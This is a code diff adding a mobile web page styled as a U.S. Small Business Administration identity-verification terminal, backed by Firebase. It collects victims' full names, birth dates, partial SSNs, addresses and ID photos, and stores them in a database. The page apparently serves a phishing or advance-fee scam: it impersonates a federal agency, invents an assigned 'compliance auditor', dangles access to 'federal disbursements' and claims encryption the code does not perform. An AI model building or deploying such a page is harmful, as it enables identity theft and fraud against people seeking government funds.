@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Identity Terminal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
+        :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
+        body { background: #f4f7f9; font-family: 'Public Sans', sans-serif; color: #0f172a; margin: 0; overflow-x: hidden; }
+
+        .header-container { background: white; padding: 12px 20px; display: flex; align-items: center; border-bottom: 3px solid var(--sba-navy); position: sticky; top: 0; z-index: 1000; }
+        .sba-logo-sm { width: 35px; height: 35px; position: relative; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .logo-text-sm { font-size: 12px; font-weight: 900; color: var(--sba-navy); z-index: 5; }
+        .brk-top { position: absolute; top: 0; right: 0; width: 70%; height: 40%; border-top: 3px solid var(--sba-navy); border-right: 3px solid var(--sba-navy); }
+        .brk-btm { position: absolute; bottom: 0; left: 0; width: 70%; height: 40%; border-bottom: 3px solid var(--sba-red); border-left: 3px solid var(--sba-red); }
+
+        .kyc-card { background: white; border-radius: 24px; padding: 25px; margin: 20px; border: 1px solid #e2e8f0; box-shadow: 0 15px 35px rgba(0,0,0,0.05); }
+        .label-text { font-size: 9px; font-weight: 900; color: #64748b; text-transform: uppercase; margin-bottom: 6px; display: block; letter-spacing: 0.5px; }
+        .input-field { width: 100%; height: 50px; background: #f8fafc; border: 2px solid #e2e8f0; border-radius: 12px; padding: 0 15px; font-size: 14px; font-weight: 700; margin-bottom: 18px; outline: none; transition: all 0.3s; }
+        .input-field:focus { border-color: var(--sba-navy); background: white; }
+        
+        .btn-gov { width: 100%; height: 65px; background: var(--sba-navy); color: white; border-radius: 15px; font-weight: 900; text-transform: uppercase; font-size: 14px; border-bottom: 5px solid #001229; margin-top: 10px; active: transform translateY(2px); }
+        
+        /* Rejection Box */
+        .decline-reason { background: #fff1f2; border-left: 5px solid #e11d48; padding: 15px; border-radius: 12px; margin-bottom: 20px; animation: shake 0.5s ease; }
+        @keyframes shake { 0%, 100% {transform: translateX(0);} 25% {transform: translateX(-5px);} 75% {transform: translateX(5px);} }
+
+        #loadingOverlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); z-index: 9999; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        #pageLoader { position: fixed; inset: 0; background: #f4f7f9; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        
+        .status-icon-wrap { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; position: relative; }
+        .success-bg { background: #f0fdf4; color: #16a34a; }
+        .review-bg { background: #eff6ff; color: #2563eb; }
+    </style>
+</head>
+<body class="pb-24">
+
+    <div id="pageLoader">
+        <div class="w-12 h-12 border-4 border-slate-200 border-t-[#002e6d] rounded-full animate-spin"></div>
+        <p class="text-[8px] font-black text-slate-400 uppercase mt-4 tracking-widest">Securing Connection...</p>
+    </div>
+
+    <div id="loadingOverlay">
+        <div class="w-16 h-16 border-4 border-slate-100 border-t-blue-600 rounded-full animate-spin mb-6"></div>
+        <p id="loadText" class="text-[11px] font-black text-slate-700 uppercase tracking-widest">Uploading to Federal Node...</p>
+        <div class="w-48 h-1 bg-slate-100 mt-4 rounded-full overflow-hidden">
+            <div id="loadBar" class="h-full bg-blue-600 w-0 transition-all duration-700"></div>
+        </div>
+    </div>
+
+    <header class="header-container">
+        <div class="sba-logo-sm"><div class="brk-top"></div><div class="logo-text-sm">SBA</div><div class="brk-btm"></div></div>
+        <div class="ml-3">
+            <h1 class="text-[10px] font-black leading-none text-[#002e6d] uppercase">Compliance Center</h1>
+            <p class="text-[7px] font-bold text-slate-400 uppercase tracking-tighter">Identity Terminal 4-A</p>
+        </div>
+        <a href="dashboard.html" class="ml-auto w-10 h-10 flex items-center justify-center bg-slate-100 rounded-full text-slate-400"><i class="fas fa-arrow-left"></i></a>
+    </header>
+
+    <main class="max-w-md mx-auto">
+        
+        <div class="kyc-card">
+            
+            <div id="reason-box" class="hidden decline-reason">
+                <div class="flex gap-3">
+                    <i class="fas fa-exclamation-triangle text-rose-600 mt-1"></i>
+                    <div>
+                        <p class="text-[10px] font-black text-rose-600 uppercase">Verification Failed</p>
+                        <p id="decline-text" class="text-[11px] font-bold text-rose-800 mt-1 leading-tight">...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div id="form-box" class="hidden space-y-1">
+                <h2 class="text-[12px] font-black text-slate-800 uppercase italic mb-4 flex items-center gap-2">
+                    <span class="w-2 h-4 bg-red-600"></span> Federal Audit Entry
+                </h2>
+                
+                <label class="label-text">Full Legal Name</label>
+                <input type="text" id="fullName" class="input-field" placeholder="Exactly as shown on ID">
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="label-text">Date of Birth</label>
+                        <input type="date" id="dob" class="input-field">
+                    </div>
+                    <div>
+                        <label class="label-text">SSN (Last 4)</label>
+                        <input type="tel" id="ssn" class="input-field" placeholder="0000" maxlength="4">
+                    </div>
+                </div>
+
+                <label class="label-text">ID Document Type</label>
+                <select id="docType" class="input-field">
+                    <option value="">-- CHOOSE DOCUMENT --</option>
+                    <option value="Driver License">Driver's License</option>
+                    <option value="Passport">International Passport</option>
+                    <option value="State ID">State Issued ID</option>
+                </select>
+
+                <div class="grid grid-cols-2 gap-3 pb-4">
+                    <div class="h-32 border-2 border-dashed border-slate-200 rounded-2xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden active:scale-95 transition-all" onclick="document.getElementById('fIn').click()">
+                        <img id="fPrev" class="absolute inset-0 w-full h-full object-cover hidden z-10">
+                        <i class="fas fa-camera text-slate-300 text-2xl"></i>
+                        <span class="text-[8px] font-black text-slate-400 uppercase mt-2">Front Side</span>
+                        <input type="file" id="fIn" hidden accept="image/*">
+                    </div>
+                    <div class="h-32 border-2 border-dashed border-slate-200 rounded-2xl flex flex-col items-center justify-center bg-slate-50 relative overflow-hidden active:scale-95 transition-all" onclick="document.getElementById('bIn').click()">
+                        <img id="bPrev" class="absolute inset-0 w-full h-full object-cover hidden z-10">
+                        <i class="fas fa-camera text-slate-300 text-2xl"></i>
+                        <span class="text-[8px] font-black text-slate-400 uppercase mt-2">Back Side</span>
+                        <input type="file" id="bIn" hidden accept="image/*">
+                    </div>
+                </div>
+
+                <label class="label-text">Residential Address</label>
+                <input type="text" id="address" class="input-field" placeholder="Street, City, Zip Code">
+
+                <button id="submitBtn" class="btn-gov">Submit for Compliance Approval</button>
+            </div>
+
+            <div id="pending-box" class="hidden text-center py-10">
+                <div class="status-icon-wrap review-bg">
+                    <i class="fas fa-shield-halved fa-beat text-3xl"></i>
+                </div>
+                <h2 class="text-lg font-black text-slate-800 uppercase italic">Review In Progress</h2>
+                <div class="w-12 h-1 bg-blue-600 mx-auto my-4"></div>
+                <p class="text-[10px] font-bold text-slate-400 px-4 uppercase leading-relaxed">Your identity documents are being verified by our Compliance Office. Do not exit this page or re-upload.</p>
+                <p class="text-[8px] font-black text-blue-600 mt-6 uppercase tracking-widest">Case ID: <span id="case-id">---</span></p>
+            </div>
+
+            <div id="verified-box" class="hidden text-center py-10">
+                <div class="status-icon-wrap success-bg">
+                    <i class="fas fa-certificate text-4xl"></i>
+                    <i class="fas fa-check absolute text-white text-xs"></i>
+                </div>
+                <h2 class="text-lg font-black text-emerald-600 uppercase italic">Identity Verified</h2>
+                <p class="text-[10px] font-bold text-slate-400 px-4 uppercase mt-4">Security clearance successfully established. You now have full access to federal disbursements.</p>
+                <a href="dashboard.html" class="inline-block mt-8 text-[10px] font-black uppercase bg-emerald-600 text-white px-8 py-3 rounded-full shadow-lg shadow-emerald-200">Return to Dashboard</a>
+            </div>
+
+        </div>
+
+        <div class="px-5 mb-10">
+            <div class="bg-white p-4 rounded-2xl border border-slate-200 flex items-center gap-4 shadow-sm">
+                <div class="relative">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=100" class="w-12 h-12 rounded-xl grayscale border shadow-sm">
+                    <div class="absolute -bottom-1 -right-1 w-4 h-4 bg-green-500 border-2 border-white rounded-full"></div>
+                </div>
+                <div class="flex-1">
+                    <p class="text-[10px] font-black uppercase text-slate-700">Sarah Miller</p>
+                    <p class="text-[8px] font-bold text-slate-400 uppercase">Compliance Auditor Assigned</p>
+                </div>
+                <a href="support.html" class="w-10 h-10 bg-slate-50 flex items-center justify-center rounded-full text-blue-600"><i class="fas fa-comment-dots text-lg"></i></a>
+            </div>
+        </div>
+
+        <div class="text-center text-[7px] text-slate-400 uppercase font-black tracking-widest pb-10">
+            Small Business Administration • Digital ID Protocol 2026<br>
+            Encrypted End-to-End PGP 4096-bit
+        </div>
+    </main>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        let fD = ""; let bD = "";
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { location.href = 'login.html'; return; }
+            document.getElementById('case-id').innerText = user.uid.substring(0,8).toUpperCase();
+
+            // LIVE LISTENER FOR STATUS CHANGES
+            onSnapshot(doc(db, "users", user.uid), (snap) => {
+                const d = snap.data();
+                document.getElementById('pageLoader').style.display = 'none';
+                if(!d) return;
+
+                const form = document.getElementById('form-box');
+                const pending = document.getElementById('pending-box');
+                const verified = document.getElementById('verified-box');
+                const reasonBox = document.getElementById('reason-box');
+
+                // 1. Logic for REJECTED/DECLINED
+                if(d.kycStatus === "DECLINED" || d.kycStatus === "FAILED") {
+                    form.classList.remove('hidden');
+                    pending.classList.add('hidden');
+                    verified.classList.add('hidden');
+                    if(d.kycNote) {
+                        reasonBox.classList.remove('hidden');
+                        document.getElementById('decline-text').innerText = d.kycNote;
+                    }
+                } 
+                // 2. Logic for PENDING
+                else if(d.kycStatus === "UNDER_REVIEW") {
+                    form.classList.add('hidden');
+                    pending.classList.remove('hidden');
+                    verified.classList.add('hidden');
+                    reasonBox.classList.add('hidden');
+                }
+                // 3. Logic for SUCCESS
+                else if(d.kycStatus === "VERIFIED" || d.kycStatus === "SUCCESSFUL") {
+                    form.classList.add('hidden');
+                    pending.classList.add('hidden');
+                    verified.classList.remove('hidden');
+                    reasonBox.classList.add('hidden');
+                }
+                // 4. Default Fresh State
+                else {
+                    form.classList.remove('hidden');
+                }
+            });
+        });
+
+        // Image Handling
+        const read = (file, side) => {
+            if(!file) return;
+            const r = new FileReader();
+            r.onload = (e) => {
+                if(side === 'f') fD = e.target.result; else bD = e.target.result;
+                const p = document.getElementById(side + 'Prev');
+                p.src = e.target.result; p.classList.remove('hidden');
+            };
+            r.readAsDataURL(file);
+        };
+        document.getElementById('fIn').onchange = (e) => read(e.target.files[0], 'f');
+        document.getElementById('bIn').onchange = (e) => read(e.target.files[0], 'b');
+
+        // SUBMISSION LOGIC
+        document.getElementById('submitBtn').onclick = async () => {
+            const fullName = document.getElementById('fullName').value;
+            const ssn = document.getElementById('ssn').value;
+            const docType = document.getElementById('docType').value;
+            const dob = document.getElementById('dob').value;
+            const address = document.getElementById('address').value;
+
+            if(!fD || !fullName || !ssn || !address || !dob || !docType) {
+                alert("FEDERAL REQUIREMENT: All fields and ID images must be provided.");
+                return;
+            }
+
+            document.getElementById('loadingOverlay').style.display = 'flex';
+            const loadBar = document.getElementById('loadBar');
+            loadBar.style.width = "40%";
+
+            try {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), {
+                    fullName: fullName,
+                    ssn: ssn,
+                    docType: docType,
+                    dob: dob,
+                    address: address,
+                    idFront: fD, 
+                    idBack: bD,
+                    kycStatus: "UNDER_REVIEW",
+                    kycDate: new Date().toLocaleString()
+                });
+                
+                loadBar.style.width = "100%";
+                setTimeout(() => { 
+                    document.getElementById('loadingOverlay').style.display = 'none'; 
+                }, 1000);
+
+            } catch (e) {
+                alert("Security Handshake Failed. Check your network.");
+                document.getElementById('loadingOverlay').style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
